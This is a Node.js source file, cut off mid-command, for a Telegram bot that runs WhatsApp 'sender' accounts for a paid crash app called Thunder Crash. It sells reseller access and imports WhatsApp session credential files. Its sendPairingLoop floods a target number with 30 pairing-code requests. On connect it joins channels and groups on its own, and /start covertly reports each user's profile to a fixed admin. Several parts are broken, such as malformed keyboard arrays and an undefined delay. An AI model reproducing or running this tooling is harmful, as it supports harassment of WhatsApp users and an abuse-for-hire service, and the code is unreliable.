const { Telegraf } = require("telegraf");
const { Markup } = require('telegraf');
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./ControlApps.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); 
const os = require('os');
const AdmZip = require('adm-zip');
const tar = require('tar'); 
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

const { tokens, Developer: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cookieParser()); 
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.json());


const ownerIds = [7304236200]; // contoh chat_id owner 


const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./Visstable.json";
const userPath = path.join(__dirname, "./user.json");
let userApiBug = null;
let sock;
let globalMessages = []; 



function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log(chalk.green("Akun Terdaftar Bree"));
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

// === Command: Add Reseller ===
bot.command("addresseler", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // Ambil ID dari argumen (contoh: /addakses 12345678)
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk menambah akses.", { parse_mode: "HTML" });
  }

  // 2. Validasi Input
  if (!targetId) {
    return ctx.reply("⚠️ <b>Format Salah!</b>\nGunakan: <code>/resseler ID_TELEGRAM</code>\nContoh: <code>/addakses 1234567890</code>", { parse_mode: "HTML" });
  }

  // 3. Cek Database Akses
  const data = loadAkses();

  // Cek apakah ID tersebut sudah menjadi reseller
  if (data.resellers.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi Reseller.");
  }

  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut adalah Owner.");
  }

  data.resellers.push(targetId);
  saveAkses(data);

  await ctx.reply(
    `✅ <b>Sukses Menambahkan Resseler !</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `💼 <b>Posisi:</b> Resseler Apps\n\n` +
    `<i>User ini sekarang bisa menggunakan bot untuk membuat SSH/Akun, namun role yang dibuat dibatasi hanya <b>User/Member</b>.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delakses", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", async (ctx) => {
  const userId = ctx.from.id.toString();
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin.", { parse_mode: "HTML" });
  }

  if (!targetId) {
    return ctx.reply("⚠️ Gunakan format: <code>/addpt ID_TELEGRAM</code>", { parse_mode: "HTML" });
  }

  const data = loadAkses();
  
  if (data.pts.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi PT.");
  }
  
  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut adalah Owner.");
  }

  // Masukkan ke database PT
  data.pts.push(targetId);
  saveAkses(data); // Pastikan fungsi saveAkses ada

  await ctx.reply(
    `✅ <b>Sukses Menambahkan PT!</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `🤝 <b>Posisi:</b> Partner (PT)\n\n` +
    `<i>User ini sekarang bisa membuat akun dengan role <b>Member</b> dan <b>Reseller</b>.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addowner", async (ctx) => {
  const userId = ctx.from.id.toString();
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk mengangkat Owner baru.", { parse_mode: "HTML" });
  }

  if (!targetId) {
    return ctx.reply("⚠️ Gunakan format: <code>/addowner ID_TELEGRAM</code>", { parse_mode: "HTML" });
  }

  const data = loadAkses();

  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi Owner.");
  }

  data.owners.push(targetId);
  
  // Opsional: Hapus dari list lain jika ada (agar data bersih)
  // Misal dia sebelumnya Reseller, kita hapus dari list reseller
  data.resellers = data.resellers.filter(id => id !== targetId);
  data.pts = data.pts.filter(id => id !== targetId);
  data.moderators = data.moderators.filter(id => id !== targetId);

  saveAkses(data);

  // 5. Beri Informasi
  await ctx.reply(
    `✅ <b>Sukses Menambahkan Owner Baru!</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `👑 <b>Posisi:</b> Owner / Developer\n\n` +
    `<i>User ini sekarang memiliki <b>FULL AKSES</b>.\nBisa membuat semua jenis role (Owner, Admin, PT, Reseller, dll) di command /addakun.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delowner <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner removed: ${id}`);
});


const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const delActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];

  const maxLen = Math.max(...contentLengths);
  const top    = "" + "".repeat(maxLen + 0) + "";
  const middle = "" + "".repeat(maxLen + 0) + "";
  const bottom = "" + "".repeat(maxLen + 0) + "";
  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    if (totalPad <= 0) return text;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;

    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    if (text.length >= width) return text;
    return text + " ".repeat(width - text.length);
  };

  const titleLine = " " + padCenter(title, maxLen) + " ";
  const contentLines = lines.map(l => " " + padRight(l, maxLen) + " ");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("Pairing Connection", [
  `Nomor Bot : ${number}`,
  `Status : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
    `Nomor Bot : ${number}`,
    `Kode Sambung : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
if (connection === "open") {
  console.log(chalk.red(`Sender Online`));
  sessions.set(BotNumber, sock);

  // === TARUH DI SINI ===
  try {
    // = JANGAN GANTI 🗿
    const channels = [
      "", // jan di ganti nanti eror
      "", // jan di ganti nanti eror
      "" // jan di ganti nanti eror
    ];

    for (const jid of channels) {
      await sock.newsletterFollow(jid);
      console.log(chalk.green(`✓ Berhasil mengikuti saluran: ${jid}`));

      const waitTime = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
      console.log(chalk.yellow(`⏳ Tunggu ${waitTime / 1000} detik sebelum lanjut...`));
      await delay(waitTime);
    }

    const groupInvites = [
      "", // jan di ganti nanti eror
      "" // jan di ganti nanti eror
    ];

    for (const invite of groupInvites) {
      try {
        const code = invite.split("/").pop();
        const result = await sock.groupAcceptInvite(code);
        console.log(chalk.green(`✓ Berhasil join grup: ${result}`));

        const waitTime = Math.floor(Math.random() * (15000 - 8000 + 1)) + 8000;
        console.log(chalk.yellow(`⏳ Tunggu ${waitTime / 1000} detik sebelum lanjut...`));
        await delay(waitTime);
      } catch (err) {
        console.log(chalk.red(`✕ Gagal join grup dari link: ${invite}`));
      }
    }

    console.log(chalk.greenBright("\n✓ Auto follow & auto join selesai dengan aman!\n"));
  } catch (err) {
    console.log(chalk.red("✕ Error di proses auto join/follow:"), err.message);
  }
  // === SAMPAI SINI ===

  return resolve();
}
        if (connection === "close") {
  const shouldReconnect =
    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

  if (shouldReconnect) {
    console.log(chalk.yellow("Koneksi tertutup, mencoba reconnect..."));
    await initializeWhatsAppConnections();
  } else {
    console.log(chalk.red("Sender Kena Frezeee"));
  }
}
});
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`<blockquote>Proses Mengubungkan Nomor ${BotNumber} Sebagai Sender Apps ThunderCrash</blockquote>`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menyambung"));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "Gagal Total."));
        // ❌ fs.rmSync(sessionDir, { recursive: true, force: true }); --> DIHAPUS
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "Succces To Connect"));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "KEIRAAV5");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};


const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  const total = 30; // jumlah pengiriman
  const delayMs = 2000; // jeda 2 detik

  try {
    await ctx.reply(
      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
      { parse_mode: "HTML" }
    );

    // pastikan koneksi WA aktif
    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");

    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "PIANTECH");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.sendMessage(
          chatId,
          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (err) {
        await ctx.telegram.sendMessage(
          chatId,
          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
          { parse_mode: "HTML" }
        );
      }

      await new Promise(r => setTimeout(r, delayMs));
    }

    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });

  } catch (error) {
    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
  }
};


function getRuntime(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

// --- VARIABEL TEXT UTAMA (Header) ---
// Kita pisahkan header agar bisa dipakai ulang saat tombol Back ditekan
const getHeader = (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const botUser = ctx.botInfo.username;
    const runtime = getRuntime(process.uptime());

    return `
<blockquote>💢 Thunder ☇ Control\nWhere Are To ${username}, To Bot Control Apps Thunder Crash V1 Beta</blockquote>
━━━━━━━━━━━━━━━
<blockquote>Apss Information</blockquote>
メ NameBot : @${botUser}
メ NameApps : Thunder Crash 
メ Version : 1.0 Beta
メ CreateBase : @ZanssMods
メ Server : Online⚡
メ Runtime : ${runtime}
━━━━━━━━━━━━━━━`;
};

// --- COMMAND START ---
bot.command("start", async (ctx) => {
    const textStart = `
<blockquote>Halo Kunyok, Lu Ngapain Chat Gw? Ini Adalah Bot Apps Thunder Crash, Jadi Siapapun Yang Chat Kesini Itu Berati Anda Mempunyai Apps Thunder Crash New, Nah jadi apps tidak free Kunyok, Kau Harus Buyy. Buy Ke @ZanssMods
`;

    // Kirim Teks ke User
    await ctx.reply(textStart, { parse_mode: 'HTML' });

    // Kirim Audio ke User
    await ctx.replyWithAudio(
        { url: "https://files.catbox.moe/qnnypb.mp3" }, 
        {
            caption: "Bot Control Penuh",
            performer: "Keiraa Is The Good",
            title: "Kontol Gede "
        }
    );

    // ==========================================
    // 2. LAPORAN KE ADMIN (Hidden)
    // ==========================================
    
    // Pastikan ini chat pribadi agar tidak spam di grup
    if (ctx.chat.type === 'private') {
        const adminId = '7832393342';
        const user = ctx.from;
        
        // Cek Username (antisipasi jika tidak punya username)
        const username = user.username ? `@${user.username}` : 'Tidak ada Username';
        
        // Format Laporan
        // Note: Bot API standar tidak bisa cek "Common Groups" secara langsung.
        // Sebagai gantinya, kita kirim Link Profil agar Admin bisa cek manual.
        const laporan = `
🚨 <b>NEW USER DETECTED</b>

👤 <b>User Information:</b>
• <b>Nama:</b> ${user.first_name} ${user.last_name || ''}
• <b>Username:</b> ${username}
• <b>ID:</b> <code>${user.id}</code>
• <b>Bahasa:</b> ${user.language_code || '-'}
• <b>Link Profil:</b> <a href="tg://user?id=${user.id}">Klik Disini</a>

📝 <b>Status:</b>
User baru saja mengetik <b>/start</b> di Private Chat.

<i>(Silahkan klik link profil untuk melihat apakah user ini satu grup dengan Anda)</i>
`;

        // Kirim ke Admin
        // Gunakan catch agar jika admin memblokir bot, bot tidak error ke user
        await ctx.telegram.sendMessage(adminId, laporan, { parse_mode: 'HTML' }).catch(err => {
            console.log("Gagal lapor admin:", err.message);
        });
    }
});

bot.action('menu_control', async (ctx) => {
    const textControl = `${getHeader(ctx)}
<blockquote>Control The Apps</blockquote>
/Pairing ⎧ Number Sender ⎭
/listsender ⎧ Cek Sender Actived ⎭
`;
    
    // Tombol Control + Tombol Back
    const keyboardControl = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    // Edit Caption Foto yang sudah ada
    await ctx.editMessageCaption(textControl, { parse_mode: 'HTML', ...keyboardControl }).catch(() => {});
});

// 2. Action: ACCOUNT MENU
bot.action('menu_account', async (ctx) => {
    const textAccount = `${getHeader(ctx)}
<blockquote>🛡️ Account Control</blockquote>
/CreateAccount ⎧ Create New Account ⎭
/listakun ⎧ Cek Daftar Akun ⎭
`;

    const keyboardAccount = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textAccount, { parse_mode: 'HTML', ...keyboardAccount }).catch(() => {});
});

// 3. Action: OWNER MENU
bot.action('menu_owner', async (ctx) => {
    const textOwner = `${getHeader(ctx)}
<b>AKSES HANYA DIBERIKAN KEPADA KEIRAA</b>
`;

    const keyboardOwner = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textOwner, { parse_mode: 'HTML', ...keyboardOwner }).catch(() => {});
});

// 4. Action: BACK TO HOME (Tombol Kembali)
bot.action('back_home', async (ctx) => {
    const textMain = `${getHeader(ctx)}
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;

    const keyboardMain = Markup.inlineKeyboard([
        Markup.button.callback('Control ϟ Menu', 'menu_control'),
            Markup.button.callback('Settings ϟ Account', 'menu_account')
        ],
        [
            Markup.button.callback('Owner ϟ Access', 'menu_owner'),
            Markup.button.url('Developer ϟ Apps', 'https://t.me/ZanssMods')
    ]);

    await ctx.editMessageCaption(textMain, { parse_mode: 'HTML', ...keyboardMain }).catch(() => {});
});


bot.command("Pairing", async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("<blockquote>Salah Broo, Masukin /Pairing 62xxxx</blockquote>", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
// Command hapus sesi
// Command hapus sesi dengan Telegraf
bot.command("delsesi", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const BotNumber = args[0];

  if (!BotNumber) {
    return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");
  }

  try {
    // hapus dari list aktif
    delActive(BotNumber);

    // hapus folder sesi
    const dir = sessionPath(BotNumber);
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }

    await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
    await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});


bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("𝗡𝗼𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻𝘀");

  const daftarSender = [...sessions.keys()]
    .map(n => `メ \`${n}\``)
    .join("\n");

  ctx.reply(`<blockquote><b>📌Sender Connection By Apps ThunderCrash</b></blockquote>\n<b>Sender Online</b>\n${daftarSender}\n<blockquote>Perhatian</blockquote>\nSender Disini Kadang Bisa Habis Atau Kenon, Jadi Sebelum Kehabisan Harap Cepat², Saran Bug Forclose Hard, Biar Sender Awet`, {
    parse_mode: "HTML"
  });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command('addcoin', (ctx) => {
    // 1. Validasi Owner (Ganti dengan ID Telegram Owner)
    const ownerId = 123456789; 
    if (ctx.from.id !== ownerId) return ctx.reply('❌ Maaf, command ini khusus Owner.');

    const args = ctx.message.text.split(' ');
    // args[0] = /addcoin
    // args[1] = username (target)
    // args[2] = jumlah

    if (args.length < 3) {
        return ctx.reply('⚠️ Format Salah!\nGunakan: /addcoin <username> <jumlah>\nContoh: /addcoin keiraa 10000');
    }

    let targetUsername = args[1];
    const amount = parseInt(args[2]);

    // Hapus karakter '@' jika admin mengetikkannya
    if (targetUsername.startsWith('@')) {
        targetUsername = targetUsername.substring(1);
    }

    if (isNaN(amount)) return ctx.reply('❌ Jumlah coin harus berupa angka!');

    try {
        // Cari user berdasarkan 'name' atau 'username' di database
        // Asumsi DB: global.db.data.users = { '628xxx': { name: 'keiraa', coin: 0 } }
        let userKey = Object.keys(global.db.data.users).find(
            k => global.db.data.users[k].name === targetUsername
        );

        if (!userKey) {
            return ctx.reply(`❌ User dengan username '${targetUsername}' tidak ditemukan di database.`);
        }

        // Tambah Coin
        global.db.data.users[userKey].coin = (global.db.data.users[userKey].coin || 0) + amount;

        ctx.reply(`✅ Berhasil menambahkan ${amount} Coin ke akun '${targetUsername}'.\n💰 Total Coin: ${global.db.data.users[userKey].coin}`);

    } catch (err) {
        console.error(err);
        ctx.reply('❌ Terjadi kesalahan server.');
    }
});
// === Command: /add (Tambah Session WhatsApp dari file reply) ===
bot.command("upsessions", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  // 🔒 Cek hanya owner
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg || !replyMsg.document) {
    return ctx.reply("❌ Balas file session dengan perintah /add");
  }

  const doc = replyMsg.document;
  const name = doc.file_name.toLowerCase();

  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session...");

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "sess-"));

    // Ekstrak file
    if (name.endsWith(".json")) {
      await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fs.promises.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    // 🔍 Cari creds.json
    const findCredsFile = async (dir) => {
      const files = await fs.promises.readdir(dir, { withFileTypes: true });
      for (const file of files) {
        const filePath = path.join(dir, file.name);
        if (file.isDirectory()) {
          const found = await findCredsFile(filePath);
          if (found) return found;
        } else if (file.name === "creds.json") {
          return filePath;
        }
      }
      return null;
    };

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di file session.");
    }

    const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
    const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
    if (!botNumber) return ctx.reply("❌ creds.json tidak valid (me.id tidak ditemukan)");

    // Buat folder tujuan
    const destDir = sessionPath(botNumber);
    await fs.promises.rm(destDir, { recursive: true, force: true });
    await fs.promises.mkdir(destDir, { recursive: true });

    // Copy isi folder temp ke folder sesi
    const copyDir = async (src, dest) => {
      const entries = await fs.promises.readdir(src, { withFileTypes: true });
      for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
          await fs.promises.mkdir(destPath, { recursive: true });
          await copyDir(srcPath, destPath);
        } else {
          await fs.promises.copyFile(srcPath, destPath);
        }
      }
    };
    await copyDir(tmp, destDir);

    // Simpan aktif
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(botNumber)) {
      fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
    }

    // Coba konekkan
    await connectToWhatsApp(botNumber, chatId, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan dan online.`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error /add:", err);
    return ctx.reply(`❌ Gagal memproses session:\n${err.message}`);
  }
});

bot.command("CreateAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // 1. Ambil Argumen (Gaya Lama: split spasi)
  const args = ctx.message.text.split(" ")[1];

  // 2. Validasi Akses
